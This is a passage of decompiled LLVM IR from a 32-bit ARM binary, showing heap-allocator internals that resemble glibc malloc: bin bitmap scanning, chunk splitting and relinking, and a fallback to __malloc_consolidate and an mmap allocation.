  %v2_169f4 = add i32 %v1_169f4, 12
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  store i32 %v0_169f4, i32* %v3_169f4, align 4
  %v0_169f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_169f8 = add i32 %v0_169f8, 8
  store i32 %v1_169f8, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_169e8, 15
  br i1 %tmp207, label %dec_label_pc_16a18, label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169e8
  %v1_16a00 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a00 = add i32 %v1_16a00, %v0_169f8
  store i32 %v2_16a00, i32* %r2.global-to-local, align 4
  %v1_16a04 = add i32 %v2_16a00, 4
  %v2_16a04 = inttoptr i32 %v1_16a04 to i32*
  %v3_16a04 = load i32, i32* %v2_16a04, align 4
  store i32 %v3_16a04, i32* %r3.global-to-local, align 4
  store i32 %v1_169f8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c.loopexit:                      ; preds = %dec_label_pc_168ac
  %v1_168b8 = load i32, i32* @r6, align 4
  %v2_168b8 = load i32, i32* @sl, align 4
  %v3_168b8 = add i32 %v2_168b8, %v1_168b8
  store i32 %v3_168b8, i32* %r2.global-to-local, align 4
  %v2_168bc = add i32 %v3_168b8, 4
  %v3_168bc = inttoptr i32 %v2_168bc to i32*
  %v4_168bc = load i32, i32* %v3_168bc, align 4
  store i32 %v4_168bc, i32* %r3.global-to-local, align 4
  %v2_168c0 = add i32 %v1_168b8, 8
  store i32 %v2_168c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %.dec_label_pc_16a0c_crit_edge, %dec_label_pc_16a0c.loopexit, %dec_label_pc_16a00
  %v1_16a10 = phi i32 [ %v4_16b34, %.dec_label_pc_16a0c_crit_edge ], [ %v3_168b8, %dec_label_pc_16a0c.loopexit ], [ %v2_16a00, %dec_label_pc_16a00 ]
  %v0_16a0c = phi i32 [ %v7_16b34, %.dec_label_pc_16a0c_crit_edge ], [ %v4_168bc, %dec_label_pc_16a0c.loopexit ], [ %v3_16a04, %dec_label_pc_16a00 ]
  %v1_16a0c = or i32 %v0_16a0c, 1
  store i32 %v1_16a0c, i32* %r3.global-to-local, align 4
  %v2_16a10 = add i32 %v1_16a10, 4
  %v3_16a10 = inttoptr i32 %v2_16a10 to i32*
  store i32 %v1_16a0c, i32* %v3_16a10, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16a18:                               ; preds = %dec_label_pc_169e8
  %v1_16a18 = load i32, i32* @sl, align 4
  %v2_16a18 = add i32 %v1_16a18, %v0_169f8
  store i32 %v2_16a18, i32* %r2.global-to-local, align 4
  %v1_16a1c = or i32 %v1_16a18, 1
  store i32 %v1_16a1c, i32* %r3.global-to-local, align 4
  %v0_16a20 = load i32, i32* %lr.global-to-local, align 4
  %v1_16a20 = or i32 %v0_16a20, 1
  store i32 %v1_16a20, i32* %r1.global-to-local, align 4
  store i32 %v1_169f8, i32* %r4.global-to-local, align 4
  %v2_16a28 = add i32 %v0_169f8, 4
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 %v1_16a1c, i32* %v3_16a28, align 4
  %v0_16a2c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a2c = load i32, i32* @r6, align 4
  %v2_16a2c = add i32 %v1_16a2c, 8
  %v3_16a2c = inttoptr i32 %v2_16a2c to i32*
  store i32 %v0_16a2c, i32* %v3_16a2c, align 4
  %v0_16a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a30 = load i32, i32* @r6, align 4
  %v2_16a30 = add i32 %v1_16a30, 12
  %v3_16a30 = inttoptr i32 %v2_16a30 to i32*
  store i32 %v0_16a30, i32* %v3_16a30, align 4
  %v0_16a34 = load i32, i32* %lr.global-to-local, align 4
  %v1_16a34 = load i32, i32* %r2.global-to-local, align 4
  %v3_16a34 = add i32 %v1_16a34, %v0_16a34
  %v4_16a34 = inttoptr i32 %v3_16a34 to i32*
  store i32 %v0_16a34, i32* %v4_16a34, align 4
  %v0_16a38 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a38 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a38 = add i32 %v1_16a38, 4
  %v3_16a38 = inttoptr i32 %v2_16a38 to i32*
  store i32 %v0_16a38, i32* %v3_16a38, align 4
  %v0_16a3c = load i32, i32* @r6, align 4
  %v1_16a3c = load i32, i32* %r2.global-to-local, align 4
  %v2_16a3c = add i32 %v1_16a3c, 12
  %v3_16a3c = inttoptr i32 %v2_16a3c to i32*
  store i32 %v0_16a3c, i32* %v3_16a3c, align 4
  %v0_16a40 = load i32, i32* @r6, align 4
  %v1_16a40 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a40 = add i32 %v1_16a40, 8
  %v3_16a40 = inttoptr i32 %v2_16a40 to i32*
  store i32 %v0_16a40, i32* %v3_16a40, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_169b4, %dec_label_pc_169a4
  %v1_169dc = phi i32 [ %storemerge.pre, %dec_label_pc_169a4 ], [ %v3_169c0, %dec_label_pc_169b4 ]
  store i32 %v1_169dc, i32* %ip.global-to-local, align 4
  %v9_16a4c = icmp eq i32 %v1_169dc, %v1_169a8
  br i1 %v9_16a4c, label %dec_label_pc_16a54.loopexit, label %dec_label_pc_169b4

dec_label_pc_16a54.loopexit:                      ; preds = %dec_label_pc_16a4c
  br label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_1699c.dec_label_pc_16a54_crit_edge, %dec_label_pc_16a54.loopexit
  %v4_16a84.pre-phi = phi i32 [ %.pre200, %dec_label_pc_1699c.dec_label_pc_16a54_crit_edge ], [ %v4_169a4, %dec_label_pc_16a54.loopexit ]
  %v1_16a54 = add i32 %v0_16a54.pre, 1
  store i32 %v1_16a54, i32* %r2.global-to-local, align 4
  %v1_16a58 = urem i32 %v1_16a54, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r0.global-to-local, align 4
  %v6_16a64 = shl i32 1, %v1_16a58
  store i32 %v6_16a64, i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16a6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16a6c, i32* %r3.global-to-local, align 4
  %v3_16a70 = udiv i32 %v1_16a54, 32
  store i32 %v3_16a70, i32* @r5, align 4
  %v4_16a74 = mul nuw nsw i32 %v3_16a70, 4
  %v5_16a74 = add i32 %v4_16a6c, %v4_16a74
  store i32 %v5_16a74, i32* %r2.global-to-local, align 4
  %v1_16a78 = add i32 %v5_16a74, 820
  %v2_16a78 = inttoptr i32 %v1_16a78 to i32*
  %v3_16a78 = load i32, i32* %v2_16a78, align 4
  store i32 %v3_16a78, i32* @r4, align 4
  %v1_16a7c = add i32 %v4_16a6c, 52
  store i32 %v1_16a7c, i32* %r3.global-to-local, align 4
  store i32 36, i32* @r8, align 4
  %v5_16a84 = add i32 %v1_16a7c, %v4_16a84.pre-phi
  store i32 %v5_16a84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a88

dec_label_pc_16a88:                               ; preds = %dec_label_pc_16af0, %dec_label_pc_16a54
  %v1_16a90 = phi i32 [ %v1_16a90.pre, %dec_label_pc_16af0 ], [ %v3_16a78, %dec_label_pc_16a54 ]
  %v0_16a90 = phi i32 [ %v0_16a88.pre, %dec_label_pc_16af0 ], [ %v6_16a64, %dec_label_pc_16a54 ]
  %v1_16a88 = sub i32 1, %v0_16a90
  %v2_16a88 = icmp ult i32 %v0_16a90, 2
  %v1_16a88. = select i1 %v2_16a88, i32 %v1_16a88, i32 0
  store i32 %v1_16a88., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_16a90, %v1_16a90
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_16a88
  %v5_16a94 = or i32 %v1_16a88., 1
  store i32 %v5_16a94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16aa0.preheader

bb142:                                            ; preds = %dec_label_pc_16a88
  %v2_16a98 = icmp eq i32 %v1_16a88., 0
  br i1 %v2_16a98, label %.dec_label_pc_16adc.preheader_crit_edge, label %dec_label_pc_16aa0.preheader

.dec_label_pc_16adc.preheader_crit_edge:          ; preds = %bb142
  %v0_16ad454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16adc.preheader

dec_label_pc_16aa0.preheader:                     ; preds = %bb142, %.thread12
  %v0_16aa0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16aa0

dec_label_pc_16aa0:                               ; preds = %dec_label_pc_16aa0.preheader, %dec_label_pc_16aac
  %v0_16aa0 = phi i32 [ %v0_16aa0.pre, %dec_label_pc_16aa0.preheader ], [ %v1_16aa0, %dec_label_pc_16aac ]
  %v1_16aa0 = add i32 %v0_16aa0, 1
  store i32 %v1_16aa0, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_16aa0, 2
  br i1 %tmp208, label %dec_label_pc_16b80.loopexit, label %dec_label_pc_16aac

dec_label_pc_16aac:                               ; preds = %dec_label_pc_16aa0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r3.global-to-local, align 4
  %v1_16ab0 = load i32, i32* @r8, align 4
  %v2_16ab0 = add i32 %v1_16ab0, ptrtoint (i32* @global_var_2e024.1314 to i32)
  %v3_16ab0 = inttoptr i32 %v2_16ab0 to i32*
  %v4_16ab0 = load i32, i32* %v3_16ab0, align 4
  store i32 %v4_16ab0, i32* %r2.global-to-local, align 4
  %v4_16ab4 = mul i32 %v1_16aa0, 4
  %v5_16ab4 = add i32 %v4_16ab0, %v4_16ab4
  store i32 %v5_16ab4, i32* %r3.global-to-local, align 4
  %v1_16ab8 = add i32 %v5_16ab4, 820
  %v2_16ab8 = inttoptr i32 %v1_16ab8 to i32*
  %v3_16ab8 = load i32, i32* %v2_16ab8, align 4
  store i32 %v3_16ab8, i32* @r4, align 4
  %v2_16abc = icmp eq i32 %v3_16ab8, 0
  br i1 %v2_16abc, label %dec_label_pc_16aa0, label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16aac
  %v4_16ac4 = mul i32 %v1_16aa0, 256
  %v5_16ac4 = add i32 %v4_16ab0, %v4_16ac4
  store i32 %v5_16ac4, i32* %r3.global-to-local, align 4
  %v1_16ac8 = add i32 %v5_16ac4, 44
  store i32 %v1_16ac8, i32* %r0.global-to-local, align 4
  %v0_16acc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16acc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16adc.preheader

dec_label_pc_16adc.preheader:                     ; preds = %.dec_label_pc_16adc.preheader_crit_edge, %dec_label_pc_16ac4
  %v0_16ad454 = phi i32 [ %v1_16ac8, %dec_label_pc_16ac4 ], [ %v0_16ad454.pre, %.dec_label_pc_16adc.preheader_crit_edge ]
  %v0_16af8 = phi i32 [ %v3_16ab8, %dec_label_pc_16ac4 ], [ %v1_16a90, %.dec_label_pc_16adc.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_16acc, %dec_label_pc_16ac4 ], [ %v0_16a90, %.dec_label_pc_16adc.preheader_crit_edge ]
  %v2_16adc51 = and i32 %ip.promoted, %v0_16af8
  %v4_16adc53 = icmp eq i32 %v2_16adc51, 0
  br i1 %v4_16adc53, label %dec_label_pc_16ad4, label %dec_label_pc_16ae4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16adc.preheader, %dec_label_pc_16ad4
  %v2_16ad856 = phi i32 [ %v2_16ad8, %dec_label_pc_16ad4 ], [ %ip.promoted, %dec_label_pc_16adc.preheader ]
  %v0_16ad455 = phi i32 [ %v1_16ad4, %dec_label_pc_16ad4 ], [ %v0_16ad454, %dec_label_pc_16adc.preheader ]
  %v1_16ad4 = add i32 %v0_16ad455, 8
  %v2_16ad8 = mul i32 %v2_16ad856, 2
  %v2_16adc = and i32 %v2_16ad8, %v0_16af8
  %v4_16adc = icmp eq i32 %v2_16adc, 0
  br i1 %v4_16adc, label %dec_label_pc_16ad4, label %dec_label_pc_16adc.dec_label_pc_16ae4_crit_edge

dec_label_pc_16adc.dec_label_pc_16ae4_crit_edge:  ; preds = %dec_label_pc_16ad4
  store i32 %v1_16ad4, i32* %r0.global-to-local, align 4
  store i32 %v2_16ad8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16adc.dec_label_pc_16ae4_crit_edge, %dec_label_pc_16adc.preheader
  %v0_16b04 = phi i32 [ %v2_16ad8, %dec_label_pc_16adc.dec_label_pc_16ae4_crit_edge ], [ %ip.promoted, %dec_label_pc_16adc.preheader ]
  %v0_16b28 = phi i32 [ %v1_16ad4, %dec_label_pc_16adc.dec_label_pc_16ae4_crit_edge ], [ %v0_16ad454, %dec_label_pc_16adc.preheader ]
  %v1_16ae4 = add i32 %v0_16b28, 12
  %v2_16ae4 = inttoptr i32 %v1_16ae4 to i32*
  %v3_16ae4 = load i32, i32* %v2_16ae4, align 4
  store i32 %v3_16ae4, i32* @lr, align 4
  %v9_16ae8 = icmp eq i32 %v3_16ae4, %v0_16b28
  br i1 %v9_16ae8, label %dec_label_pc_16af0, label %dec_label_pc_16b10

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ae4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r0.global-to-local, align 4
  %v1_16af4 = load i32, i32* @r8, align 4
  %v2_16af4 = add i32 %v1_16af4, ptrtoint (i32* @global_var_2e024.1314 to i32)
  %v3_16af4 = inttoptr i32 %v2_16af4 to i32*
  %v4_16af4 = load i32, i32* %v3_16af4, align 4
  %v2_16af8 = sub i32 -1, %v0_16b04
  %v3_16af8 = and i32 %v0_16af8, %v2_16af8
  store i32 %v3_16af8, i32* @r4, align 4
  %v1_16afc = load i32, i32* @r5, align 4
  %v4_16afc = mul i32 %v1_16afc, 4
  %v5_16afc = add i32 %v4_16afc, %v4_16af4
  store i32 %v5_16afc, i32* %r3.global-to-local, align 4
  %v1_16b00 = add i32 %v0_16b28, 8
  store i32 %v1_16b00, i32* %r0.global-to-local, align 4
  %v2_16b04 = mul i32 %v0_16b04, 2
  store i32 %v2_16b04, i32* %ip.global-to-local, align 4
  %v2_16b08 = add i32 %v5_16afc, 820
  %v3_16b08 = inttoptr i32 %v2_16b08 to i32*
  store i32 %v3_16af8, i32* %v3_16b08, align 4
  %v0_16a88.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_16a90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16a88

dec_label_pc_16b10:                               ; preds = %dec_label_pc_16ae4
  %v1_16b10 = add i32 %v3_16ae4, 4
  %v2_16b10 = inttoptr i32 %v1_16b10 to i32*
  %v3_16b10 = load i32, i32* %v2_16b10, align 4
  store i32 %v3_16b10, i32* %r3.global-to-local, align 4
  %v1_16b14 = and i32 %v3_16b10, -4
  store i32 %v1_16b14, i32* %r2.global-to-local, align 4
  %v0_16b18 = load i32, i32* @sl, align 4
  %v2_16b18 = sub i32 %v1_16b14, %v0_16b18
  store i32 %v2_16b18, i32* %ip.global-to-local, align 4
  %v1_16b1c = add i32 %v3_16ae4, 12
  %v2_16b1c = inttoptr i32 %v1_16b1c to i32*
  %v3_16b1c = load i32, i32* %v2_16b1c, align 4
  store i32 %v3_16b1c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_16b18, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_16b10
  %v6_16b24 = add i32 %v1_16b14, %v3_16ae4
  store i32 %v6_16b24, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_16b10, %bb143
  %v2_16b28 = add i32 %v3_16b1c, 8
  %v3_16b28 = inttoptr i32 %v2_16b28 to i32*
  store i32 %v0_16b28, i32* %v3_16b28, align 4
  %v0_16b2c = load i32, i32* %r3.global-to-local, align 4
  %v1_16b2c = load i32, i32* %r0.global-to-local, align 4
  %v2_16b2c = add i32 %v1_16b2c, 12
  %v3_16b2c = inttoptr i32 %v2_16b2c to i32*
  store i32 %v0_16b2c, i32* %v3_16b2c, align 4
  %v4_16b30 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_16a0c_crit_edge, label %dec_label_pc_16b3c

.dec_label_pc_16a0c_crit_edge:                    ; preds = %bb144
  %v5_16b30 = add i32 %v4_16b30, 8
  store i32 %v5_16b30, i32* %r4.global-to-local, align 4
  %v4_16b34 = load i32, i32* %r2.global-to-local, align 4
  %v5_16b34 = add i32 %v4_16b34, 4
  %v6_16b34 = inttoptr i32 %v5_16b34 to i32*
  %v7_16b34 = load i32, i32* %v6_16b34, align 4
  store i32 %v7_16b34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16b3c:                               ; preds = %bb144
  %v1_16b3c = load i32, i32* @sl, align 4
  %v2_16b3c = add i32 %v1_16b3c, %v4_16b30
  store i32 %v2_16b3c, i32* %r1.global-to-local, align 4
  %v1_16b44 = load i32, i32* @r6, align 4
  %v2_16b44 = add i32 %v1_16b44, 8
  %v3_16b44 = inttoptr i32 %v2_16b44 to i32*
  store i32 %v2_16b3c, i32* %v3_16b44, align 4
  %v0_16b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b48 = load i32, i32* @r6, align 4
  %v2_16b48 = add i32 %v1_16b48, 12
  %v3_16b48 = inttoptr i32 %v2_16b48 to i32*
  store i32 %v0_16b48, i32* %v3_16b48, align 4
  %v0_16b4c = load i32, i32* @r6, align 4
  %v1_16b4c = load i32, i32* %r1.global-to-local, align 4
  %v2_16b4c = add i32 %v1_16b4c, 8
  %v3_16b4c = inttoptr i32 %v2_16b4c to i32*
  store i32 %v0_16b4c, i32* %v3_16b4c, align 4
  %v0_16b50 = load i32, i32* @r6, align 4
  %v1_16b50 = load i32, i32* %r1.global-to-local, align 4
  %v2_16b50 = add i32 %v1_16b50, 12
  %v3_16b50 = inttoptr i32 %v2_16b50 to i32*
  store i32 %v0_16b50, i32* %v3_16b50, align 4
  %tmp210 = icmp ult i32 %v1_16b3c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_16b3c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v8_16b5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v8_16b5c, i32* %r3.global-to-local, align 4
  %v4_16b60 = load i32, i32* %r1.global-to-local, align 4
  %v6_16b60 = add i32 %v8_16b5c, 48
  %v7_16b60 = inttoptr i32 %v6_16b60 to i32*
  store i32 %v4_16b60, i32* %v7_16b60, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_16b3c, %bb145
  %v0_16b64 = load i32, i32* @sl, align 4
  %v1_16b64 = or i32 %v0_16b64, 1
  store i32 %v1_16b64, i32* %r2.global-to-local, align 4
  %v0_16b68 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b68 = or i32 %v0_16b68, 1
  store i32 %v1_16b68, i32* %r3.global-to-local, align 4
  %v0_16b6c = load i32, i32* @lr, align 4
  %v1_16b6c = add i32 %v0_16b6c, 8
  store i32 %v1_16b6c, i32* %r4.global-to-local, align 4
  %v2_16b70 = add i32 %v0_16b6c, 4
  %v3_16b70 = inttoptr i32 %v2_16b70 to i32*
  store i32 %v1_16b64, i32* %v3_16b70, align 4
  %v0_16b74 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b74 = load i32, i32* %r1.global-to-local, align 4
  %v3_16b74 = add i32 %v1_16b74, %v0_16b74
  %v4_16b74 = inttoptr i32 %v3_16b74 to i32*
  store i32 %v0_16b74, i32* %v4_16b74, align 4
  %v0_16b78 = load i32, i32* %r3.global-to-local, align 4
  %v1_16b78 = load i32, i32* %r1.global-to-local, align 4
  %v2_16b78 = add i32 %v1_16b78, 4
  %v3_16b78 = inttoptr i32 %v2_16b78 to i32*
  store i32 %v0_16b78, i32* %v3_16b78, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16b80.loopexit:                      ; preds = %dec_label_pc_16aa0
  br label %dec_label_pc_16b80

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b80.loopexit, %dec_label_pc_16794, %dec_label_pc_1679c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  %v4_16b88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16b88, i32* @r0, align 4
  %v1_16b8c = add i32 %v4_16b88, 44
  %v2_16b8c = inttoptr i32 %v1_16b8c to i32*
  %v3_16b8c = load i32, i32* %v2_16b8c, align 4
  store i32 %v3_16b8c, i32* %ip.global-to-local, align 4
  %v1_16b90 = add i32 %v3_16b8c, 4
  %v2_16b90 = inttoptr i32 %v1_16b90 to i32*
  %v3_16b90 = load i32, i32* %v2_16b90, align 4
  %v0_16b94 = load i32, i32* @sl, align 4
  %v1_16b94 = add i32 %v0_16b94, 16
  store i32 %v1_16b94, i32* %r1.global-to-local, align 4
  %v1_16b98 = and i32 %v3_16b90, -4
  store i32 %v1_16b98, i32* %r3.global-to-local, align 4
  %v3_16b9c = icmp ult i32 %v1_16b98, %v1_16b94
  br i1 %v3_16b9c, label %dec_label_pc_16bcc, label %dec_label_pc_16ba8

dec_label_pc_16ba8:                               ; preds = %dec_label_pc_16b80
  %v2_16ba8 = sub i32 %v1_16b98, %v0_16b94
  %v2_16bac = add i32 %v0_16b94, %v3_16b8c
  store i32 %v2_16bac, i32* %r1.global-to-local, align 4
  %v1_16bb0 = or i32 %v2_16ba8, 1
  store i32 %v1_16bb0, i32* %r3.global-to-local, align 4
  %v1_16bb4 = or i32 %v0_16b94, 1
  store i32 %v1_16bb4, i32* %r2.global-to-local, align 4
  %v1_16bb8 = add i32 %v3_16b8c, 8
  store i32 %v1_16bb8, i32* %r4.global-to-local, align 4
  store i32 %v1_16bb4, i32* %v2_16b90, align 4
  %v0_16bc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16bc0 = load i32, i32* @r0, align 4
  %v2_16bc0 = add i32 %v1_16bc0, 44
  %v3_16bc0 = inttoptr i32 %v2_16bc0 to i32*
  store i32 %v0_16bc0, i32* %v3_16bc0, align 4
  %v0_16bc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_16bc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_16bc4 = add i32 %v1_16bc4, 4
  %v3_16bc4 = inttoptr i32 %v2_16bc4 to i32*
  store i32 %v0_16bc4, i32* %v3_16bc4, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16b80
  %v1_16bcc = inttoptr i32 %v4_16b88 to i32*
  %v2_16bcc = load i32, i32* %v1_16bcc, align 4
  store i32 %v2_16bcc, i32* %r3.global-to-local, align 4
  %v1_16bd0 = and i32 %v2_16bcc, 2
  store i32 %v1_16bd0, i32* %ip.global-to-local, align 4
  %v2_16bd0 = icmp eq i32 %v1_16bd0, 0
  %v1_16bd4 = add i32 %v4_16b88, 860
  %v2_16bd4 = inttoptr i32 %v1_16bd4 to i32*
  %v3_16bd4 = load i32, i32* %v2_16bd4, align 4
  store i32 %v3_16bd4, i32* %r1.global-to-local, align 4
  br i1 %v2_16bd0, label %dec_label_pc_16bec, label %dec_label_pc_16bdc

dec_label_pc_16bdc:                               ; preds = %dec_label_pc_16bcc
  %v0_16bdc = call i32 @__malloc_consolidate()
  %v0_16be0 = load i32, i32* @sl, align 4
  %v1_16be0 = add i32 %v0_16be0, -7
  store i32 %v1_16be0, i32* %r0.global-to-local, align 4
  %v1_16be4 = call i32 @malloc(i32 %v1_16be0)
  store i32 %v1_16be4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fc8

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bcc
  %v1_16bec = add i32 %v4_16b88, 844
  %v2_16bec = inttoptr i32 %v1_16bec to i32*
  %v3_16bec = load i32, i32* %v2_16bec, align 4
  store i32 %v3_16bec, i32* %r3.global-to-local, align 4
  %v3_16bf0 = icmp ult i32 %v0_16b94, %v3_16bec
  %v1_16bf4 = add i32 %v3_16bd4, -1
  store i32 %v1_16bf4, i32* %sb.global-to-local, align 4
  br i1 %v3_16bf0, label %dec_label_pc_16cc8, label %dec_label_pc_16bfc

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16bec
  %v1_16bfc = add i32 %v4_16b88, 852
  %v2_16bfc = inttoptr i32 %v1_16bfc to i32*
  %v3_16bfc = load i32, i32* %v2_16bfc, align 4
  store i32 %v3_16bfc, i32* %r2.global-to-local, align 4
  %v1_16c00 = add i32 %v4_16b88, 848
  %v2_16c00 = inttoptr i32 %v1_16c00 to i32*
  %v3_16c00 = load i32, i32* %v2_16c00, align 4
  store i32 %v3_16c00, i32* %r3.global-to-local, align 4
  %v6_16c08 = icmp slt i32 %v3_16c00, %v3_16bfc
  br i1 %v6_16c08, label %dec_label_pc_16c0c, label %dec_label_pc_16cc8

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16bfc
  %v1_16c0c = add i32 %v0_16b94, 10
  %v2_16c10 = add i32 %v1_16c0c, %v3_16bd4
  store i32 %v2_16c10, i32* %r3.global-to-local, align 4
  %v2_16c14 = sub i32 0, %v3_16bd4
  %v3_16c14 = and i32 %v2_16c10, %v2_16c14
  store i32 %v3_16c14, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_16c14, %v0_16b94
  br i1 %tmp211, label %dec_label_pc_16c20, label %dec_label_pc_16cc8

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c0c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_16c14, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16c38 = call i32 @mmap(i32 0, i32 %v3_16c14, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16c38, i32* %r0.global-to-local, align 4
  %v7_16c3c = icmp eq i32 %v6_16c38, -1
  br i1 %v7_16c3c, label %dec_label_pc_16c20.dec_label_pc_16cc8_crit_edge, label %dec_label_pc_16c44

dec_label_pc_16c20.dec_label_pc_16cc8_crit_edge:  ; preds = %dec_label_pc_16c20
  %v1_16cec.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16c44:                               ; preds = %dec_label_pc_16c20
  %v1_16c44 = urem i32 %v6_16c38, 8
  store i32 %v1_16c44, i32* %r2.global-to-local, align 4
  %v2_16c44 = icmp eq i32 %v1_16c44, 0
  br i1 %v2_16c44, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_16c44
  %v2_16c48 = sub nsw i32 8, %v1_16c44
  store i32 %v2_16c48, i32* %r3.global-to-local, align 4
  %v2_16c4c = load i32, i32* @r4, align 4
  %v3_16c4c = sub i32 %v2_16c4c, %v2_16c48
  %v3_16c50 = add i32 %v2_16c48, %v6_16c38
  store i32 %v3_16c50, i32* %lr.global-to-local, align 4
  %v2_16c58 = or i32 %v3_16c4c, 2
  store i32 %v2_16c58, i32* %r2.global-to-local, align 4
  %v5_16c60 = inttoptr i32 %v3_16c50 to i32*
  store i32 %v2_16c48, i32* %v5_16c60, align 4
  %v1_16c64 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c64 = load i32, i32* %lr.global-to-local, align 4
  %v3_16c64 = add i32 %v2_16c64, 4
  %v4_16c64 = inttoptr i32 %v3_16c64 to i32*
  store i32 %v1_16c64, i32* %v4_16c64, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_16c44
  store i32 %v6_16c38, i32* %lr.global-to-local, align 4
  %v1_16c5c47 = load i32, i32* @r4, align 4
  %v2_16c5c48 = or i32 %v1_16c5c47, 2
  store i32 %v2_16c5c48, i32* %r3.global-to-local, align 4
  %v3_16c68 = inttoptr i32 %v6_16c38 to i32*
  store i32 0, i32* %v3_16c68, align 4
  %v1_16c6c = load i32, i32* %r3.global-to-local, align 4
  %v2_16c6c = load i32, i32* %lr.global-to-local, align 4
  %v3_16c6c = add i32 %v2_16c6c, 4
  %v4_16c6c = inttoptr i32 %v3_16c6c to i32*
  store i32 %v1_16c6c, i32* %v4_16c6c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16c78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16c78, i32* %ip.global-to-local, align 4
  %v1_16c7c = add i32 %v4_16c78, 848
  %v2_16c7c = inttoptr i32 %v1_16c7c to i32*
  %v3_16c7c = load i32, i32* %v2_16c7c, align 4
  store i32 %v3_16c7c, i32* %r3.global-to-local, align 4
  %v1_16c80 = add i32 %v4_16c78, 856
  %v2_16c80 = inttoptr i32 %v1_16c80 to i32*
  %v3_16c80 = load i32, i32* %v2_16c80, align 4
